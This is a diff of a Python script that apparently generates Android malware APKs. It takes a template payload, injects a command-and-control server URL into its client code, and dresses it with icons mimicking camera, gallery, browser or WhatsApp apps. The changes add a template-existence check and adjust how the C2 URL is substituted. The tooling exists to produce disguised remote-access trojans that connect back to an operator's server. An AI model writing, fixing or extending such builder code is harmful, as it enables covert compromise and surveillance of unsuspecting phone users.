@@ -14,15 +14,6 @@ PAYLOAD_DIR = Path(__file__).parent.parent / 'payload'
 OUTPUT_DIR = Path(__file__).parent.parent / 'output'
 TEMPLATE_APK = PAYLOAD_DIR / 'template' / 'payload_template.apk'
 APKTOOL_PATH = shutil.which('apktool')
-JAVA_PATH = shutil.which('java')
-
-ICONS = {
-    'camera': 'ic_camera',
-    'settings': 'ic_settings',
-    'gallery': 'ic_gallery',
-    'browser': 'ic_browser',
-    'whatsapp': 'ic_whatsapp'
-}
 
 def generate_apk(apk_name, c2_url, icon_type='camera'):
     """
@@ -34,6 +25,11 @@ def generate_apk(apk_name, c2_url, icon_type='camera'):
 
     if not c2_url:
         print("[-] URL do C2 é obrigatória")
+        return None
+    
+    if not TEMPLATE_APK.exists():
+        print(f"[-] Template APK não encontrado em: {TEMPLATE_APK}")
+        print("    Compila primeiro o payload com build_payload.sh")
         return None
 
     OUTPUT_DIR.mkdir(exist_ok=True)
@@ -68,8 +64,8 @@ def generate_apk(apk_name, c2_url, icon_type='camera'):
         with open(c2_client_file, 'r') as f:
             content = f.read()
 
+        content = content.replace('http://10.0.0.1:5000', c2_url)
         content = content.replace('ws://10.0.0.1:5000', c2_url)
-        content = content.replace('http://10.0.0.1:5000', c2_url.replace('ws', 'http'))
 
         with open(c2_client_file, 'w') as f:
             f.write(content)
